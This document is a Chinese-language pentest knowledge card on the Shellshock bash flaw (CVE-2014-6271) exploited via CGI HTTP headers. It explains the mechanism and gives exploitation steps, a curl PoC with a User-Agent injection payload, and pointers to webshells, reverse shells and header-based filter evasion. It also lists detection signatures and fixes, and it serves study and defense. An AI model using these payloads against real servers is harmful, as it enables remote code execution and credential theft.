---
id: web-generic-rce-shellshock-cgi-user-agent-env-function
title: Shellshock CGI RCE：User-Agent 等 HTTP 头映射为函数形式环境变量，bash 启动时执行尾部注入命令
type: scenario
domain: web
path: web/generic
technique: shellshock-cgi-env-function-command-injection
aliases:
- Shellshock
- Bash 破壳漏洞
- CVE-2014-6271
- CGI Shellshock
- User-Agent 命令执行
- 环境变量函数注入
- bash 函数环境变量
tags:
- shellshock
- bash
- cgi
- environment-variable
- rce
- web
- apache
cve:
- CVE-2014-6271
severity: critical
confidence: high
affected_versions: GNU Bash <= 4.3（原文标记；实际以是否含 Shellshock 补丁为准）
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-V352
  verified_at: '2026-11-09T00:52:11+08:00'
  notes: 已对照原文与图01-14、20-22核对：Bash 4.3及之前、字符串函数环境变量被误当函数、parse_and_execute 尾部注入与补丁判断 if((flags & SEVAL_FUNCDEF) && command->type != cm_function_def)、修复版只输出2、Apache fork/exec 把 HTTP 头转 HTTP_* 环境变量、hello.sh+curl payload 与 vulnerable 回显均一致。CVE-2014-6271 由原文参考资料明确标注。affected_versions 保留原文 Bash<=4.3。卡片仅覆盖 CGI 远程面，SUID/SSH/DHCP 为独立场景卡，互不重复。PoC 未执行；frontmatter 无 sources/source_url；dup-scan(19:10)早于本批建卡无涉及 pair。
---

## 一句话结论

Bash 4.3 及更早版本在启动时会重新解析环境变量，值以 `()` 和 `{` 开头即被当成导出函数导入，且解析器在函数定义结束后没有截断，尾巴上的命令会被一并执行；CGI 把 HTTP 请求头映射成 `HTTP_*` 环境变量，攻击者在 `User-Agent` 等头里写入 `() { :; }; <命令>`，即可让 CGI 脚本的 bash 解释器在启动时执行任意命令，权限为 Web 服务进程用户。

## 原理

- **前置：变量与函数的继承差异**：普通 shell 变量只存在于当前 shell，子进程看不到；`export` 后的环境变量会被子进程继承；普通函数只存在于当前 shell，`export -f` 后才会以环境变量形式传给子进程（`env` 中可见 `name=() { ...; }`）。
- **漏洞点一：字符串形式的"函数环境变量"被误当函数**：把一个看起来像函数定义的字符串赋给变量再导出（如 `test3='() { echo "1"; }'; export test3`），新 bash 启动时会把它解析成函数，之后 `test3` 可直接调用。bash 在新进程初始化环境变量时，发现值里出现小括号与花括号就认定它是函数定义，用变量名作函数名、值作函数体。
- **漏洞点二：函数定义尾部注入**：Bash 初始化环境时对 `name=value` 调用 `parse_and_execute`（源码位置在 `builtins/evalstring.c`，等价于对赋值串做一次 eval）。它读到函数定义的闭合 `}` 后没有停止，继续把后面的内容当命令执行；因此 `x='() { :;}; echo 1'` 导出的环境变量在子 bash 启动时会执行 `echo 1`。补丁增加的判断是 `if ((flags & SEVAL_FUNCDEF) && command->type != cm_function_def)`，用于确认解析出的确实只是函数定义而非附加命令。
- **如何变成远程 RCE**：漏洞本身只作用于"新启动的 bash 进程"，必须借助第三方程序把攻击者可控数据放进环境变量并启动 bash。CGI 正好满足：Apache 收到 CGI 请求后 `fork()` 子进程并 `exec()` CGI 脚本，HTTP 请求头按 CGI 规范转成 `HTTP_USER_AGENT`、`HTTP_REFERER`、`HTTP_COOKIE` 等环境变量；若 CGI 脚本的 shebang 是 `#!/bin/bash`（或脚本内部启动 bash），bash 启动解析环境变量时即触发注入。脚本本身即使不打印 User-Agent 也不影响触发。
- **触发三要素**：目标 bash 存在漏洞（≤4.3 且未打补丁）；攻击者能控制环境变量（HTTP 头、SSH 原始命令、DHCP option 等）；有一个会启动新 bash 的第三方进程作为媒介。
- **为什么成立**：HTTP 头完全由客户端控制，CGI 规范又要求把它们原样放入环境变量；bash 的函数导入是隐式且无过滤的，二者叠加形成"请求头即命令"的注入面。

## 触发条件

- 目标 Bash 版本 ≤ 4.3 且未安装 Shellshock 补丁（补丁版本会忽略以 `()` 开头的环境变量值）。
- Web 服务器启用 CGI（如 Apache `a2enmod cgi`），且 `cgi-bin` 下的 CGI 程序可访问。
- CGI 程序由 bash 解释（shebang `#!/bin/bash`）或内部会启动 bash 子进程。
- 攻击者能设置任意 HTTP 头；Web 服务进程有权限执行所需命令（通常为 www-data/apache，权限有限但足以读取配置、反弹 shell）。

## 利用步骤

1. **本地验证漏洞**：在目标同类环境执行 `env x='() { :;}; echo 1' bash -c "echo 2"`；有漏洞时同时输出 `1` 和 `2`，已打补丁的 bash 只输出 `2`。注意 `()` 与 `{` 之间必须有空格。
2. **确认 CGI 可达**：请求 `cgi-bin` 下的脚本，确认返回正常 CGI 响应。
3. **用无害命令验证注入**：`curl -H "User-agent: () { :; }; echo; echo vulnerable" http://target/cgi-bin/hello.sh`，响应中出现 `vulnerable` 即命令被执行（执行者为 Apache 运行用户）。
4. **替换为实际命令**：把 `echo vulnerable` 换成读文件、写 WebShell、反弹 shell 等；同一 payload 可放在 `Referer`、`Cookie` 等其他头中，绕过只检查 User-Agent 的规则。
5. **评估权限并维持访问**：以 Web 用户权限收集配置/数据库凭据、内网探测，必要时反弹交互式 shell。

## PoC

本地漏洞检测：

```bash
env x='() { :;}; echo 1' bash -c "echo 2"
# 有漏洞：先输出 1 再输出 2；已修复：只输出 2
```

CGI 注入：

```bash
# CGI 脚本 hello.sh（#!/bin/bash）会把 User-Agent 放进 HTTP_USER_AGENT 环境变量
curl -H "User-agent: () { :; }; echo; echo vulnerable" http://localhost/cgi-bin/hello.sh
# 响应中出现 vulnerable，说明函数定义后的命令被执行
```

实际命令只需替换注入段，例如 `() { :; }; /bin/bash -c 'id > /tmp/x'`；反弹 shell 时把命令改为对应的 bash/python 载荷。

## 变体与关联

- **变体（注入载体）**：任何进入环境变量并启动 bash 的数据源都可复用本原语——SSH 客户端命令（`SSH_ORIGINAL_COMMAND`）、DHCP option 114、SUID 程序继承的环境变量，分别见关联卡。
- **变体（头位置）**：`User-Agent`、`Referer`、`Cookie`、`X-Forwarded-For` 等所有被 CGI 映射为环境变量的头都可尝试；也可用请求体构造环境变量（视 CGI 程序实现）。
- **修复后的相似机制**：Bash 4.3 补丁后仍支持 `BASH_FUNC_name%%=() { ...; }` 形式的导出函数；若应用把用户输入作为环境变量键值传给 bash，仍可能被函数导出机制利用（PHP `putenv` 场景见关联卡），与本 CVE 不是同一根因。
- 关联：[[web-php-rce-putenv-bash-func-env-injection]]（补丁后 `BASH_FUNC_` 函数导出滥用）、[[pentest-privilege-escalation-shellshock-suid-system-sh-bash-p]]（SUID 程序转移执行点）、[[pentest-privilege-escalation-shellshock-ssh-forcedcommand-original-command]]（SSH 受限命令绕过）、[[pentest-lateral-movement-shellshock-dhcp-option-114-client-rce]]（DHCP 客户端批量 RCE）。

## 检测与防御

- **检测**：WAF/IDS 在请求头、Cookie、请求体中匹配 `() {`、`() { :;}`、`BASH_FUNC_`、`/bin/bash`、`/bin/sh -c` 等特征；Web 进程日志中出现异常 `HTTP_*` 值；监控 Apache/Web 用户派生的 bash 子进程与其执行的命令。
- **修复**：升级 Bash 到含 Shellshock 补丁的版本（各发行版补丁级别不同，以发行版公告为准），升级后重启依赖 bash 的服务。
- **加固**：CGI 脚本改用非 bash 解释器（如 dash/perl/python），或显式清理环境；禁用不必要的 CGI；Web 进程以低权限用户运行并限制出网；对关键 CGI 目录做访问控制。
- **响应**：发现利用后检查 Web 用户权限范围内的文件变更、WebShell、计划任务与外连；轮换服务器上 Web 应用可读取的凭据。
